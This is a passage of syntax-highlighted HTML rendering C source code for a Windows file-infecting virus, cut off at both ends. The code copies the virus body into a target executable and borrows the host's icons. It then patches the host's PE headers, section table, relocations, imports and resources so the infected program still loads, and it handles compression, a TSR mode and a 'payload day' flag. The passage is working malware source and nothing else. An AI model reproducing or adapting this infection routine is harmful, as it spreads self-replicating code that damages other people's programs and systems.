          </span><span class="sc11">CancelFileSeek</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">IDYES</span><span class="sc10">:</span><span class="sc0">
      </span><span class="sc9">#endif
</span><span class="sc0">      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">OpenMapFile</span><span class="sc10">(</span><span class="sc11">PathName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">WRITE_ACCESS</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc9">#ifdef icon
</span><span class="sc0">        </span><span class="sc11">IconImages</span><span class="sc10">.</span><span class="sc11">pLargeIcon</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">IconImages</span><span class="sc10">.</span><span class="sc11">pSmallIcon</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">bPayLoadDay</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">bValidHeader</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
          </span><span class="sc11">GetDefaultIcons</span><span class="sc10">(&amp;</span><span class="sc11">IconImages</span><span class="sc10">,</span><span class="sc0">
                          </span><span class="sc11">Rva2Ptr</span><span class="sc10">(</span><span class="sc11">PVOID</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pMZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pMZ</span><span class="sc10">-&gt;</span><span class="sc11">e_lfanew</span><span class="sc10">));</span><span class="sc0">
          </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">IconImages</span><span class="sc10">.</span><span class="sc11">pLargeIcon</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">pSrc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PBYTE</span><span class="sc10">)</span><span class="sc11">IconImages</span><span class="sc10">.</span><span class="sc11">pLargeIcon</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">pTgt</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">HostLargeIcon</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">nCount</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">SIZEOF_LARGE_ICON</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pTgt</span><span class="sc10">++</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pSrc</span><span class="sc10">++;</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(--</span><span class="sc11">nCount</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">IconImages</span><span class="sc10">.</span><span class="sc11">pSmallIcon</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
              </span><span class="sc11">pSrc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PBYTE</span><span class="sc10">)</span><span class="sc11">IconImages</span><span class="sc10">.</span><span class="sc11">pSmallIcon</span><span class="sc10">;</span><span class="sc0">
              </span><span class="sc11">nCount</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">SIZEOF_SMALL_ICON</span><span class="sc10">;</span><span class="sc0">
              </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pTgt</span><span class="sc10">++</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pSrc</span><span class="sc10">++;</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(--</span><span class="sc11">nCount</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
          </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc9">#endif
</span><span class="sc0">        </span><span class="sc9">#ifdef compr
</span><span class="sc0">        </span><span class="sc11">pTgt</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Rva2Ptr</span><span class="sc10">(</span><span class="sc11">PBYTE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pMZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CipherTarget</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">pSrc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PBYTE</span><span class="sc10">)</span><span class="sc11">CipherSource</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">nCount</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">nComprSize</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pTgt</span><span class="sc10">++</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pSrc</span><span class="sc10">++;</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(--</span><span class="sc11">nCount</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">GlobalFree</span><span class="sc10">(</span><span class="sc11">pComprBuf</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">pComprBuf</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc2">//This line is optional
</span><span class="sc0">        </span><span class="sc11">_pHostPE</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">pHostPE</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Rva2Ptr</span><span class="sc10">(</span><span class="sc11">PIMAGE_NT_HEADERS</span><span class="sc10">,</span><span class="sc0">
                                     </span><span class="sc11">pMZ</span><span class="sc10">,</span><span class="sc0">
                                     </span><span class="sc11">TgtVir</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc9">#else
</span><span class="sc0">        </span><span class="sc11">_pHostPE</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">pHostPE</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Rva2Ptr</span><span class="sc10">(</span><span class="sc11">PIMAGE_NT_HEADERS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc2">//The comented code
</span><span class="sc0">                                     </span><span class="sc11">pMZ</span><span class="sc10">,</span><span class="sc0">               </span><span class="sc2">//  below generates
</span><span class="sc0">                                     </span><span class="sc11">TgtVir</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">_TgtVir</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc2">//  more bytez than
</span><span class="sc0">        </span><span class="sc9">#endif                                          </span><span class="sc2">//  this code becoz
</span><span class="sc0">        </span><span class="sc11">pTgt</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PBYTE</span><span class="sc10">)</span><span class="sc11">pHostPE</span><span class="sc10">;</span><span class="sc0">                          </span><span class="sc2">//  the linker adds
</span><span class="sc0">        </span><span class="sc11">pSrc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PBYTE</span><span class="sc10">)</span><span class="sc11">SrcVir</span><span class="sc10">;</span><span class="sc0">                           </span><span class="sc2">//  other functionz
</span><span class="sc0">        </span><span class="sc11">nCount</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">VIRUS_SIZE</span><span class="sc10">;</span><span class="sc0">                            </span><span class="sc2">//  not needed!
</span><span class="sc0">        </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pTgt</span><span class="sc10">++</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pSrc</span><span class="sc10">++;</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(--</span><span class="sc11">nCount</span><span class="sc10">);</span><span class="sc0">         </span><span class="sc2">//
</span><span class="sc0">
</span><span class="sc2">//        CopyMemory((PBYTE)(pHostPE = Rva2Ptr(PIMAGE_NT_HEADERS, //Not in
//                                             pMZ,               //any DLL
//                                             TgtVir)),          //but in
//                   (PBYTE)SrcVir,                               //a RTL.
//                   VIRUS_SIZE);                                 //
</span><span class="sc0">
        </span><span class="sc9">#ifdef tsr
</span><span class="sc0">        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ProgType</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">TSR_COPY</span><span class="sc10">)</span><span class="sc0">
          </span><span class="sc10">*</span><span class="sc11">Rva2Ptr</span><span class="sc10">(</span><span class="sc11">PPROG_TYPE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pHostPE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">RawProgType</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">HOST_COPY</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc9">#endif
</span><span class="sc0">        </span><span class="sc10">*</span><span class="sc11">Rva2Ptr</span><span class="sc10">(</span><span class="sc11">PDWORD</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pHostPE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">RawSrcVir</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">TgtVir</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">*</span><span class="sc11">Rva2Ptr</span><span class="sc10">(</span><span class="sc11">PDWORD</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pHostPE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">RawOldPtr2NewEXE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">pMZ</span><span class="sc10">-&gt;</span><span class="sc11">e_lfanew</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">*</span><span class="sc11">Rva2Ptr</span><span class="sc10">(</span><span class="sc11">PDWORD</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pHostPE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">RawOldFileSize</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FindData</span><span class="sc10">.</span><span class="sc11">nFileSizeLow</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc9">#ifdef compr
</span><span class="sc0">        </span><span class="sc10">*</span><span class="sc11">Rva2Ptr</span><span class="sc10">(</span><span class="sc11">PDWORD</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pHostPE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">RawnComprSize</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">nComprSize</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">*</span><span class="sc11">Rva2Ptr</span><span class="sc10">(</span><span class="sc11">PDWORD</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pHostPE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">RawCipherTarget</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CipherTarget</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc9">#endif
</span><span class="sc0">
        </span><span class="sc11">_RvaDelta</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">RvaDelta</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
          </span><span class="sc10">((</span><span class="sc11">pHostPE</span><span class="sc10">-&gt;</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">SizeOfHeaders</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0">
              </span><span class="sc10">(</span><span class="sc11">RawDelta</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">TgtVir</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">pHostMZ</span><span class="sc10">-&gt;</span><span class="sc11">e_lfanew</span><span class="sc10">))</span><span class="sc0">
            </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0xFFF</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">0x1000</span><span class="sc10">)</span><span class="sc0">
          </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">pHostPE</span><span class="sc10">-&gt;</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">BaseOfCode</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc2">// fix RVAs in PE header..
</span><span class="sc0">
        </span><span class="sc11">pHostPE</span><span class="sc10">-&gt;</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">AddressOfEntryPoint</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">RvaDelta</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">pHostPE</span><span class="sc10">-&gt;</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">BaseOfCode</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">RvaDelta</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">pHostPE</span><span class="sc10">-&gt;</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">BaseOfData</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">RvaDelta</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">pSectionHdr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">IMAGE_FIRST_SECTION</span><span class="sc10">(</span><span class="sc11">pHostPE</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">nSections</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">pHostPE</span><span class="sc10">-&gt;</span><span class="sc11">FileHeader</span><span class="sc10">.</span><span class="sc11">NumberOfSections</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
          </span><span class="sc11">pSectionHdr</span><span class="sc10">-&gt;</span><span class="sc11">PointerToRawData</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">RawDelta</span><span class="sc10">;</span><span class="sc0">
          </span><span class="sc11">pSectionHdr</span><span class="sc10">++-&gt;</span><span class="sc11">VirtualAddress</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">RvaDelta</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(--</span><span class="sc11">nSections</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">pHostPE</span><span class="sc10">-&gt;</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">SizeOfImage</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
          </span><span class="sc10">(</span><span class="sc11">pSectionHdr</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)-&gt;</span><span class="sc11">VirtualAddress</span><span class="sc0">
          </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pSectionHdr</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)-&gt;</span><span class="sc11">Misc</span><span class="sc10">.</span><span class="sc11">VirtualSize</span><span class="sc0">
          </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0xFFF</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">0x1000</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">nRvas</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">pHostPE</span><span class="sc10">-&gt;</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">NumberOfRvaAndSizes</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
          </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">pHostPE</span><span class="sc10">-&gt;</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">DataDirectory</span><span class="sc10">[--</span><span class="sc11">nRvas</span><span class="sc10">].</span><span class="sc0">
                        </span><span class="sc11">VirtualAddress</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
          </span><span class="sc11">pHostPE</span><span class="sc10">-&gt;</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">DataDirectory</span><span class="sc10">[</span><span class="sc11">nRvas</span><span class="sc10">].</span><span class="sc0">
                   </span><span class="sc11">VirtualAddress</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">RvaDelta</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">nRvas</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc2">// fix RVAs in code &amp; reloc section..
</span><span class="sc0">
        </span><span class="sc11">pEndRelocs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
          </span><span class="sc11">Rva2Ptr</span><span class="sc10">(</span><span class="sc0">
            </span><span class="sc11">PBYTE</span><span class="sc10">,</span><span class="sc0">
            </span><span class="sc10">(</span><span class="sc11">pRelocs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
               </span><span class="sc11">Rva2Raw</span><span class="sc10">(</span><span class="sc11">pHostPE</span><span class="sc10">-&gt;</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc0">
                       </span><span class="sc11">DataDirectory</span><span class="sc10">[</span><span class="sc11">IMAGE_DIRECTORY_ENTRY_BASERELOC</span><span class="sc10">].</span><span class="sc0">
                       </span><span class="sc11">VirtualAddress</span><span class="sc10">)),</span><span class="sc0">
            </span><span class="sc11">pHostPE</span><span class="sc10">-&gt;</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc0">
                     </span><span class="sc11">DataDirectory</span><span class="sc10">[</span><span class="sc11">IMAGE_DIRECTORY_ENTRY_BASERELOC</span><span class="sc10">].</span><span class="sc0">
                     </span><span class="sc11">Size</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">IMAGE_SIZEOF_BASE_RELOCATION</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
          </span><span class="sc11">pRelocBase</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Rva2Raw</span><span class="sc10">(</span><span class="sc11">pRelocs</span><span class="sc10">-&gt;</span><span class="sc11">VirtualAddress</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">RvaDelta</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc11">pRelocData</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PIMAGE_RELOCATION_DATA</span><span class="sc10">)(</span><span class="sc11">pRelocs</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc10">)</span><span class="sc11">pRelocs</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">pRelocs</span><span class="sc10">-&gt;</span><span class="sc11">SizeOfBlock</span><span class="sc10">;</span><span class="sc0">
          </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pRelocData</span><span class="sc10">-&gt;</span><span class="sc11">RelocType</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">IMAGE_REL_BASED_HIGHLOW</span><span class="sc10">)</span><span class="sc0">
              </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">*</span><span class="sc11">Rva2Ptr</span><span class="sc10">(</span><span class="sc11">PDWORD</span><span class="sc10">,</span><span class="sc0">
                     </span><span class="sc11">pRelocBase</span><span class="sc10">,</span><span class="sc0">
                     </span><span class="sc11">pRelocData</span><span class="sc10">-&gt;</span><span class="sc11">RelocOffset</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">RvaDelta</span><span class="sc10">;</span><span class="sc0">
          </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">DWORD</span><span class="sc10">)++</span><span class="sc11">pRelocData</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc10">)</span><span class="sc11">pRelocs</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">DWORD</span><span class="sc10">)</span><span class="sc11">pRelocs</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc10">)</span><span class="sc11">pEndRelocs</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc2">// fix RVAs in import section..
</span><span class="sc0">
        </span><span class="sc11">pImports</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
          </span><span class="sc11">Rva2Raw</span><span class="sc10">(</span><span class="sc11">pHostPE</span><span class="sc10">-&gt;</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc0">
                           </span><span class="sc11">DataDirectory</span><span class="sc10">[</span><span class="sc11">IMAGE_DIRECTORY_ENTRY_IMPORT</span><span class="sc10">].</span><span class="sc0">
                           </span><span class="sc11">VirtualAddress</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
          </span><span class="sc11">pImportData</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
            </span><span class="sc9">#ifdef _MSC_VER
</span><span class="sc0">            </span><span class="sc11">Rva2Raw</span><span class="sc10">((</span><span class="sc11">DWORD</span><span class="sc10">)</span><span class="sc11">pImports</span><span class="sc10">-&gt;</span><span class="sc11">OriginalFirstThunk</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">RvaDelta</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc9">#endif
</span><span class="sc0">            </span><span class="sc9">#ifdef __BORLANDC__
</span><span class="sc0">            </span><span class="sc11">Rva2Raw</span><span class="sc10">((</span><span class="sc11">DWORD</span><span class="sc10">)</span><span class="sc11">pImports</span><span class="sc10">-&gt;</span><span class="sc11">u</span><span class="sc10">.</span><span class="sc11">OriginalFirstThunk</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">RvaDelta</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc9">#endif
</span><span class="sc0">          </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">DWORD</span><span class="sc10">)</span><span class="sc11">pImportData</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
              </span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc10">)</span><span class="sc11">pImportData</span><span class="sc10">-&gt;</span><span class="sc11">u1</span><span class="sc10">.</span><span class="sc11">AddressOfData</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">RvaDelta</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">DWORD</span><span class="sc10">)(++</span><span class="sc11">pImportData</span><span class="sc10">)-&gt;</span><span class="sc11">u1</span><span class="sc10">.</span><span class="sc11">AddressOfData</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc11">pImports</span><span class="sc10">-&gt;</span><span class="sc11">Name</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">RvaDelta</span><span class="sc10">;</span><span class="sc0">
          </span><span class="sc11">pImportData</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Rva2Raw</span><span class="sc10">((</span><span class="sc11">DWORD</span><span class="sc10">)</span><span class="sc11">pImports</span><span class="sc10">-&gt;</span><span class="sc11">FirstThunk</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">RvaDelta</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc10">)</span><span class="sc11">pImportData</span><span class="sc10">-&gt;</span><span class="sc11">u1</span><span class="sc10">.</span><span class="sc11">AddressOfData</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">RvaDelta</span><span class="sc10">;</span><span class="sc0">
          </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">DWORD</span><span class="sc10">)(++</span><span class="sc11">pImportData</span><span class="sc10">)-&gt;</span><span class="sc11">u1</span><span class="sc10">.</span><span class="sc11">AddressOfData</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc10">((++</span><span class="sc11">pImports</span><span class="sc10">)-&gt;</span><span class="sc11">Name</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc9">#ifdef icon
</span><span class="sc0">        </span><span class="sc2">// fix RVAs in resource section..
</span><span class="sc0">
        </span><span class="sc11">pRsrcStart</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
          </span><span class="sc11">Rva2Raw</span><span class="sc10">(</span><span class="sc11">pHostPE</span><span class="sc10">-&gt;</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc0">
                           </span><span class="sc11">DataDirectory</span><span class="sc10">[</span><span class="sc11">IMAGE_DIRECTORY_ENTRY_RESOURCE</span><span class="sc10">].</span><span class="sc0">
                           </span><span class="sc11">VirtualAddress</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">Rva2Ptr</span><span class="sc10">(</span><span class="sc11">PDWORD</span><span class="sc10">,</span><span class="sc0">
                                                      </span><span class="sc11">pHostPE</span><span class="sc10">,</span><span class="sc0">
                                                      </span><span class="sc11">RawOldResourceAddr</span><span class="sc10">)</span><span class="sc0">
                                               </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">RvaDelta</span><span class="sc10">));</span><span class="sc0">
        </span><span class="sc10">((</span><span class="sc11">PBYTE</span><span class="sc10">)</span><span class="sc11">pRsrcStart</span><span class="sc10">)[</span><span class="sc4">0x2E</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">((</span><span class="sc11">PBYTE</span><span class="sc10">)</span><span class="sc11">pRsrcStart</span><span class="sc10">)[</span><span class="sc4">0x4E4</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">FixResources</span><span class="sc10">(</span><span class="sc11">pRsrcStart</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">IconImages</span><span class="sc10">.</span><span class="sc11">pLargeIcon</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">bPayLoadDay</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
          </span><span class="sc11">pHostPE</span><span class="sc10">-&gt;</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc0">
                   </span><span class="sc11">DataDirectory</span><span class="sc10">[</span><span class="sc11">IMAGE_DIRECTORY_ENTRY_RESOURCE</span><span class="sc10">].</span><span class="sc0">
